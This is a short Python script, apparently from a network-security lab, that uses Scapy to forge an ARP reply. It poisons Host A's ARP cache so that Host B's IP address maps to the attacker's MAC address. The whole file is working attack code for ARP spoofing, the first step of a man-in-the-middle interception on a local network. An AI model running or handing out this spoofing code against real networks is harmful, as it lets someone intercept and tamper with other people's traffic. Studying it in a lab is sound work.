#!/usr/bin/env python3 
from scapy.all import * 
eth = Ether()
ThisMac="02:42:0a:09:00:69" # Mac Address of HostM(attacker)
TargetMac="02:42:0a:09:00:05" # Mac Address of HostA
eth.dst = TargetMac # for communication we bind Target Mac, attacker's MAC together 
eth.src = ThisMac 
## build a forge ARP 
arp = ARP() 
arp.op = 2 # 1 for ARP request; 2 for ARP reply
FakeIP='10.9.0.6' #HOST B
TargetIP='10.9.0.5'#HOST A
arp.psrc = FakeIP # p refers IP, psrc is the source IP we set as HOSTB
arp.hwsrc = ThisMac# hw refers Hardware, it is our MAC ADDRESS, we bind<IP:HOSTB,MAC:HOSTM>
arp.pdst = TargetIP # pdstd is hostA , which we want to attack
arp.hwdst = TargetMac # hostA's MAC ADDRESS
pkt = eth/arp 
sendp(pkt)#  send the packet by layer2, otherwise, it may be droped by os
